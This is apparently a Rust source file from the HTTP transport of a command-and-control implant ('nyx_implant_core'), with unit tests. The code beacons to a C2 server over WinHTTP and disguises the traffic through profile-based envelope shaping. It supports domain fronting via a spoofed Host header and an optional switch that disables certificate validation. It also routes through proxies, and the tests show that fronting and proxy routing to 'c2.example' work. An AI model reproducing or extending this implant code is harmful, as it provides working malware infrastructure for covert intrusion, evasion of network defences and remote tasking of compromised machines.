/// 3xx redirects → channel failure (same rationale as post_frame). Must be
/// set BEFORE the first send.
unsafe fn post_frame_enhanced_disable_redirects(fns: &WinhttpFns, req: HINTERNET) {
    if let Some(set_opt) = fns.set_option {
        let disable: u32 = WINHTTP_DISABLE_REDIRECTS;
        let _ = set_opt(
            req,
            WINHTTP_OPTION_DISABLE_FEATURE,
            &disable as *const u32 as *const u8,
            4,
        );
    }
}

/// Envelope shaping (same as post_frame).
fn post_frame_enhanced_shape_envelope(body: &[u8]) -> (StaticHeaders, Vec<u8>, DataHeader) {
    // ---- Envelope shaping (same as post_frame) ----
    let csteps = crate::envelopes::post_client_steps();
    let cterm = crate::envelopes::post_client_terminator();
    let cheaders = crate::envelopes::post_client_headers();
    let shaped = nyx_profile::encode(&csteps, body);
    let (wire_body, data_header): (Vec<u8>, DataHeader) = match &cterm {
        Some(nyx_profile::Terminator::Header(name)) => {
            (Vec::new(), Some((name.as_bytes().to_vec(), shaped)))
        }
        _ => (shaped, None),
    };
    (cheaders, wire_body, data_header)
}

/// Collect headers: profile static + data-header + fronting Host, and add
/// them to the request. Returns false on a failed add — the fronting Host
/// header (and in the header-terminator case the whole frame) rides in these
/// headers, so a failed add is a channel failure (the caller closes the
/// handle chain).
unsafe fn post_frame_enhanced_add_headers(
    fns: &WinhttpFns,
    req: HINTERNET,
    cheaders: &nyx_implant_core::heap::Vec<(&'static [u8], &'static [u8])>,
    data_header: &Option<(Vec<u8>, Vec<u8>)>,
    fronting_host: &[u8],
) -> bool {
    // ---- Collect headers: profile static + data-header + fronting Host ----
    if let Some(add_req_headers) = fns.add_request_headers {
        let mut hdr: Vec<u8> = Vec::new();
        // Profile-declared static headers.
        for &(n, v) in cheaders.iter() {
            hdr.extend_from_slice(n);
            hdr.extend_from_slice(b": ");
            hdr.extend_from_slice(v);
            hdr.extend_from_slice(b"\r\n");
        }
        // Header-terminator data.
        if let Some((n, v)) = &data_header {
            hdr.extend_from_slice(n);
            hdr.extend_from_slice(b": ");
            hdr.extend_from_slice(v);
            hdr.extend_from_slice(b"\r\n");
        }
        // Domain fronting: override the Host header. WinHttpAddRequestHeaders
        // with ADD|REPLACE (0xA0000000, applied at the send call below)
        // replaces the auto-generated Host: <connect_host> with the fronting
        // domain (and ADDs it when WinHTTP hasn't materialized one yet).
        if !fronting_host.is_empty() {
            hdr.extend_from_slice(b"Host: ");
            hdr.extend_from_slice(fronting_host);
            hdr.extend_from_slice(b"\r\n");
        }
        if !hdr.is_empty() {
            let hdr16 = to_utf16(&hdr);
            let hdr_len = (hdr16.len() - 1) as u32;
            // Propagate header-set failure — same rationale as post_frame: the
            // fronting Host header (and in the header-terminator case the whole
            // frame) rides in these headers; a failed add is a channel failure.
            // Flags are ADD|REPLACE (0xA0000000): bare REPLACE fails when the
            // header doesn't exist yet (see post_frame_add_headers), and the
            // fronting Host replace only works if ADD|REPLACE also ADDS when
            // WinHTTP hasn't materialized its auto-Host header yet.
            if add_req_headers(req, hdr16.as_ptr(), hdr_len, 0xA000_0000) == 0 {
                return false;
            }
        }
    }
    true
}

/// Send request (with cert-ignore, same pre-send approach as post_frame).
/// Returns false on any failure (the caller closes the handle chain).
unsafe fn post_frame_enhanced_maybe_relax_cert(
    fns: &WinhttpFns,
    req: HINTERNET,
    use_tls: bool,
) -> bool {
    // ---- Send request (with cert-ignore, same pre-send approach as post_frame) ----
    let can_relax_cert = use_tls && fns.set_option.is_some() && tls_insecure_retry();
    if can_relax_cert {
        let tls_flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
            | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
            | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        let set_opt = match fns.set_option {
            Some(f) => f,
            None => return false,
        };
        if set_opt(
            req,
            WINHTTP_OPTION_SECURITY_FLAGS,
            &tls_flags as *const u32 as *const u8,
            4,
        ) == 0
        {
            // Could not set relaxation flags — abort rather than send strict.
            return false;
        }
    }
    true
}

/// WinHttpSendRequest with the shaped wire body. Returns false on failure
/// (the caller closes the handle chain).
unsafe fn post_frame_enhanced_send(fns: &WinhttpFns, req: HINTERNET, wire_body: &[u8]) -> bool {
    let ok = (fns.send_request)(
        req,
        core::ptr::null(),
        0,
        wire_body.as_ptr(),
        wire_body.len() as u32,
        wire_body.len() as u32,
        0,
    );
    ok != 0
}

/// Read response (same bounded-read logic as post_frame). Returns None when
/// the accumulated size would exceed MAX_RESPONSE_BYTES (closing the handle
/// chain first).
unsafe fn post_frame_enhanced_read_response(
    fns: &WinhttpFns,
    req: HINTERNET,
    conn: HINTERNET,
    session: HINTERNET,
) -> Option<Vec<u8>> {
    // ---- Read response (same bounded-read logic as post_frame) ----
    let mut out: Vec<u8> = Vec::new();
    #[allow(unused_assignments)]
    let mut avail: u32 = 0;
    loop {
        avail = 0;
        if (fns.query_data)(req, &mut avail) == 0 || avail == 0 {
            break;
        }
        let capped = (avail as usize).min(1 << 20);
        let mut chunk = nyx_implant_core::heap::vec![0u8; capped];
        let mut read: u32 = 0;
        if (fns.read_data)(req, chunk.as_mut_ptr(), capped as u32, &mut read) == 0 || read == 0 {
            break;
        }
        let n = (read as usize).min(capped);
        if out.len().saturating_add(n) > MAX_RESPONSE_BYTES {
            (fns.close_handle)(req);
            (fns.close_handle)(conn);
            (fns.close_handle)(session);
            return None;
        }
        out.extend_from_slice(&chunk[..n]);
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testutil;
    use std::time::Duration;

    #[test]
    fn to_utf16_zero_extends_ascii_and_nul_terminates() {
        assert_eq!(to_utf16(b"abc").as_slice(), &[0x61u16, 0x62, 0x63, 0]);
        assert_eq!(to_utf16(b"").as_slice(), &[0u16]);
        // Bytes are zero-extended, never UTF-8-decoded (hosts/paths are ASCII).
        assert_eq!(to_utf16(&[0xC3, 0xA9]).as_slice(), &[0xC3u16, 0xA9, 0]);
    }

    #[test]
    fn tls_insecure_retry_reflects_build_env() {
        // Default builds (env unset) must NOT relax certificate validation;
        // only an explicit NYX_TLS_INSECURE=1 at build time opts in.
        let expect = matches!(option_env!("NYX_TLS_INSECURE"), Some("1"));
        assert_eq!(tls_insecure_retry(), expect);
    }

    #[test]
    fn shape_envelope_matches_baked_steps_and_terminator() {
        let body = b"\x01\x02frame-bytes\xFE\xFF";
        let (_headers, wire_body, data_header) = post_frame_shape_envelope(body);
        let expected = nyx_profile::encode(&crate::envelopes::post_client_steps(), body);
        match crate::envelopes::post_client_terminator() {
            Some(nyx_profile::Terminator::Header(name)) => {
                // Header terminator: the ENTIRE frame rides in the header.
                assert!(wire_body.is_empty());
                let (n, v) = data_header.as_ref().expect("header terminator ⇒ data header");
                assert_eq!(n, name.as_bytes());
                assert_eq!(*v, expected);
            }
            _ => {
                assert!(data_header.is_none());
                assert_eq!(wire_body, expected);
            }
        }
        // Enhanced path shapes identically.
        let (_h2, wire2, dh2) = post_frame_enhanced_shape_envelope(body);
        assert_eq!(wire2, wire_body);
        assert_eq!(dh2, data_header);
    }

    #[test]
    fn invert_server_envelope_decodes_baked_steps() {
        let ssteps = crate::envelopes::post_server_steps();
        let payload = b"task-payload-\x00\xFF\x10";
        let mut out = nyx_profile::encode(&ssteps, payload);
        post_frame_invert_server_envelope(&mut out);
        assert_eq!(out, payload);
        // A body that fails decode is kept RAW so the frame parse fails loudly
        // upstream instead of silently dropping the cycle.
        if !ssteps.is_empty() {
            let garbage: Vec<u8> = Vec::from([0xFF, 0xFE, 0xFD, 0xFC, 0xFB].as_slice());
            if nyx_profile::decode(&ssteps, &garbage).is_err() {
                let mut out = garbage.clone();
                post_frame_invert_server_envelope(&mut out);
                assert_eq!(out, garbage);
            }
        }
    }

    /// End-to-end WinHTTP round trip against a one-shot 127.0.0.1 server:
    /// verifies PEB-walk resolution of winhttp.dll, the open/connect/send/
    /// receive chain, client-envelope shaping on the wire, and server-envelope
    /// inversion on the response.
    #[test]
    fn post_frame_loopback_roundtrip() {
        let payload = b"frame-\xDE\xAD\xBE\xEF";
        let (port, rx) = testutil::one_shot_http_server(testutil::server_wire_response(b"TASKS"));
        let out = unsafe { post_frame(b"127.0.0.1", port, b"/beacon", payload, false) };
        assert_eq!(out.as_deref(), Some(b"TASKS".as_slice()));
        let cap = rx
            .recv_timeout(Duration::from_secs(15))
            .expect("server captured request");
        assert!(
            cap.request_line.starts_with("POST /beacon "),
            "request line: {}",
            cap.request_line
        );
        // Whatever the client envelope did to the body is what hit the wire.
        let (_h, wire_body, data_header) = post_frame_shape_envelope(payload);
        match data_header {
            Some((n, v)) => {
                assert!(wire_body.is_empty());
                assert!(cap.body.is_empty(), "body must be empty with header terminator");
                let needle = format!(
                    "{}: {}",
                    String::from_utf8_lossy(&n),
                    String::from_utf8_lossy(&v)
                )
                .to_lowercase();
                assert!(
                    cap.headers.contains(&needle),
                    "data header missing; got headers:\n{}",
                    cap.headers
                );
            }
            None => assert_eq!(cap.body, wire_body),
        }
        // User-Agent: the profile's baked UA, else the transport default.
        let ua = if crate::envelopes::POST_CLIENT_UA.is_empty() {
            "mozilla/5.0".to_string()
        } else {
            String::from_utf8_lossy(crate::envelopes::POST_CLIENT_UA).to_lowercase()
        };
        assert!(
            cap.headers.contains(&format!("user-agent: {ua}")),
            "UA header missing; got headers:\n{}",
            cap.headers
        );
    }

    #[test]
    fn post_frame_closed_port_returns_none() {
        // Bind then drop → a port nothing listens on: connect must fail and
        // map to None (channel failure → fallback chain), never panic/hang.
        let port = {
            let l = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
            l.local_addr().unwrap().port()
        };
        assert!(unsafe { post_frame(b"127.0.0.1", port, b"/beacon", b"x", false) }.is_none());
    }

    #[test]
    fn post_frame_enhanced_fronting_host_overrides_host_header() {
        let (port, rx) = testutil::one_shot_http_server(testutil::server_wire_response(b"OK"));
        let opts = HttpOpts {
            fronting_host: b"cdn-front.example",
            proxy_url: b"",
        };
        let out = unsafe { post_frame_enhanced(b"127.0.0.1", port, b"/beacon", b"PING", false, &opts) };
        assert_eq!(out.as_deref(), Some(b"OK".as_slice()));
        let cap = rx
            .recv_timeout(Duration::from_secs(15))
            .expect("server captured request");
        // Domain fronting: TCP went to 127.0.0.1 but the Host header carries
        // the fronting domain.
        assert!(
            cap.headers.contains("host: cdn-front.example"),
            "fronting Host header missing; got headers:\n{}",
            cap.headers
        );
    }

    #[test]
    fn post_frame_enhanced_named_proxy_routes_via_proxy() {
        let (port, rx) = testutil::one_shot_http_server(testutil::server_wire_response(b"OK"));
        let proxy = format!("127.0.0.1:{port}");
        let opts = HttpOpts {
            fronting_host: b"",
            proxy_url: proxy.as_bytes(),
        };
        // server_host is unresolvable — only the proxy path can succeed.
        let out = unsafe {
            post_frame_enhanced(b"c2.example", 8443, b"/beacon", b"PING", false, &opts)
        };
        assert_eq!(out.as_deref(), Some(b"OK".as_slice()));
        let cap = rx
            .recv_timeout(Duration::from_secs(15))
            .expect("proxy captured request");
        // A proxy request uses absolute-form: POST http://host:port/beacon.
        assert!(
            cap.request_line.contains("/beacon"),
            "request line: {}",
            cap.request_line
        );
    }
}

